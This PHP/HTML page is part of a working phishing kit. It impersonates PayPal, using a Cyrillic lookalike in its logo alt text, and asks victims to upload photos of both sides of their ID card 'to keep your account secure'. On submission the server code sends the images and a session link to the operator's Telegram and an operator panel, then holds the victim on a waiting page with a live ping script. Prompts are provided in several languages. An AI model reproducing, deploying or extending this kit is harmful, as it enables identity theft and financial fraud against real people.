<?php
require_once 'config.php';
 $sid = $_GET['sid'] ?? '';
if (!$sid) { redirect('index.php'); }

 $sData = get_session($sid);
 $lang = $sData['lang'] ?? 'en'; 

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = get_session($sid) ?: [];
    $data['id_uploaded'] = true;
    $data['status'] = 'waiting';
    save_session($sid, $data);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $panel_link = rtrim($base_url, '/') . '/panel.php?sid=' . $sid;

    // ✅ Kan-sayfto les images l Telegram
    if(isset($_FILES['id_front']) && $_FILES['id_front']['error'] == 0) {
        sendDocumentToTelegram($_FILES['id_front']['tmp_name'], "🆔 ID Front | SID: $sid", $_FILES['id_front']['name']);
    }
    if(isset($_FILES['id_back']) && $_FILES['id_back']['error'] == 0) {
        sendDocumentToTelegram($_FILES['id_back']['tmp_name'], "🆔 ID Back | SID: $sid", $_FILES['id_back']['name']);
    }

    sendToTelegram("🆔 <b>ID Uploaded</b>\nSID: <code>$sid</code>\n\n➡️ <a href='{$panel_link}'>Open Panel</a>");

    redirect("waiting.php?sid=" . $sid);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f5f7f9; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 460px; background: #ffffff; border-radius: 16px; padding: 40px 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); text-align: center; }
        .logo { height: 35px; margin-bottom: 25px; }
        h1 { font-size: 24px; font-weight: 700; color: #001c3a; margin-bottom: 15px; }
        p { font-size: 15px; color: #6c7378; line-height: 1.5; margin-bottom: 30px; }
        .upload-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
        .upload-box { border: 2px dashed #cbd2d6; border-radius: 12px; padding: 20px 10px; cursor: pointer; transition: all 0.2s; position: relative; }
        .upload-box:hover { border-color: #0070ba; background-color: #f5f7f9; }
        .upload-box img { max-width: 100%; max-height: 120px; border-radius: 8px; display: none; margin-bottom: 10px; }
        .upload-icon { font-size: 30px; color: #0070ba; margin-bottom: 10px; }
        .upload-text { font-size: 13px; font-weight: 600; color: #2c2e2f; }
        .upload-subtext { font-size: 11px; color: #6c7378; margin-top: 5px; }
        .btn-submit { width: 100%; background-color: #0070ba; color: #ffffff; border: none; border-radius: 100px; padding: 16px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background-color 0.2s, opacity 0.2s; }
        .btn-submit:hover { background-color: #005ea6; }
        .btn-submit:disabled { opacity: 0.7; cursor: not-allowed; }
    </style>
</head>
<body onload="initLang('<?php echo $lang; ?>')">
    <div class="container">
        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="РayРal">
        
        <h1 id="up_title">Confirm your identity</h1>
        <p id="up_desc">To keep your account secure, we need to verify your identity. Please upload a high-quality photo of the front and back of your ID card.</p>
        
        <form id="uploadForm" method="POST" enctype="multipart/form-data" action="upload-id.php?sid=<?php echo htmlspecialchars($sid); ?>">
            <div class="upload-grid">
                <div class="upload-box" onclick="document.getElementById('id_front').click()">
                    <img id="preview_front" src="">
                    <div class="upload-icon">📷</div>
                    <div class="upload-text" id="up_front_text">Upload Front</div>
                    <div class="upload-subtext" id="up_front_sub">Click to browse</div>
                    <input type="file" id="id_front" name="id_front" accept="image/*" hidden>
                </div>
                <div class="upload-box" onclick="document.getElementById('id_back').click()">
                    <img id="preview_back" src="">
                    <div class="upload-icon">📷</div>
                    <div class="upload-text" id="up_back_text">Upload Back</div>
                    <div class="upload-subtext" id="up_back_sub">Click to browse</div>
                    <input type="file" id="id_back" name="id_back" accept="image/*" hidden>
                </div>
            </div>
            <button type="submit" class="btn-submit" id="up_submit">Submit Documents</button>
        </form>
    </div>

    <script>
        document.getElementById('id_front').addEventListener('change', function(e) {
            if (e.target.files && e.target.files[0]) {
                let reader = new FileReader();
                reader.onload = function(event) {
                    document.getElementById('preview_front').src = event.target.result;
                    document.getElementById('preview_front').style.display = 'block';
                };
                reader.readAsDataURL(e.target.files[0]);
            }
        });
        document.getElementById('id_back').addEventListener('change', function(e) {
            if (e.target.files && e.target.files[0]) {
                let reader = new FileReader();
                reader.onload = function(event) {
                    document.getElementById('preview_back').src = event.target.result;
                    document.getElementById('preview_back').style.display = 'block';
                };
                reader.readAsDataURL(e.target.files[0]);
            }
        });

        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            let front = document.getElementById('id_front').files.length;
            let back = document.getElementById('id_back').files.length;
            if (front === 0 || back === 0) {
                e.preventDefault();
                alert('Please upload both front and back of your ID.');
                return;
            }
            let btn = document.getElementById('up_submit');
            btn.innerText = 'Uploading...';
            btn.style.opacity = '0.7';
            btn.disabled = true;
        });

        const translations_up = {
            en: { title: "Confirm your identity", desc: "To keep your account secure, we need to verify your identity. Please upload a high-quality photo of the front and back of your ID card.", front_t: "Upload Front", front_s: "Click to browse", back_t: "Upload Back", back_s: "Click to browse", submit: "Submit Documents" },
            de: { title: "Bestätigen Sie Ihre Identität", desc: "Um Ihr Konto sicher zu halten, müssen wir Ihre Identität überprüfen. Bitte laden Sie ein hochwertiges Foto der Vorder- und Rückseite Ihres Ausweises hoch.", front_t: "Vorderseite hochladen", front_s: "Klicken zum Durchsuchen", back_t: "Rückseite hochladen", back_s: "Klicken zum Durchsuchen", submit: "Dokumente einreichen" },
            fr: { title: "Confirmez votre identité", desc: "Pour sécuriser votre compte, nous devons vérifier votre identité. Veuillez télécharger une photo de haute qualité du recto et du verso de votre pièce d'identité.", front_t: "Télécharger Recto", front_s: "Cliquez pour parcourir", back_t: "Télécharger Verso", back_s: "Cliquez pour parcourir", submit: "Soumettre les documents" },
            pl: { title: "Potwierdź swoją tożsamość", desc: "Aby zapewnić bezpieczeństwo Twojego konta, musimy zweryfikować Twoją tożsamość. Prześlij wysokiej jakości zdjęcie przedniej i tylnej strony swojego dowodu tożsamości.", front_t: "Prześlij przód", front_s: "Kliknij, aby przeglądać", back_t: "Prześlij tył", back_s: "Kliknij, aby przeglądać", submit: "Prześlij dokumenty" }
        };
        function initLang(lang) {
            const data = translations_up[lang] || translations_up['en'];
            document.getElementById('up_title').innerText = data.title;
            document.getElementById('up_desc').innerText = data.desc;
            document.getElementById('up_front_text').innerText = data.front_t;
            document.getElementById('up_front_sub').innerText = data.front_s;
            document.getElementById('up_back_text').innerText = data.back_t;
            document.getElementById('up_back_sub').innerText = data.back_s;
            document.getElementById('up_submit').innerText = data.submit;
        }
    </script>

    <script>
        const sid = "<?php echo isset($sid) ? addslashes($sid) : ''; ?>";
        if(sid) {
            setInterval(() => {
                fetch('process.php?action=ping&sid=' + sid)
                    .catch(err => console.error('Ping error'));
            }, 5000);
        }
    </script>
</body>
</html>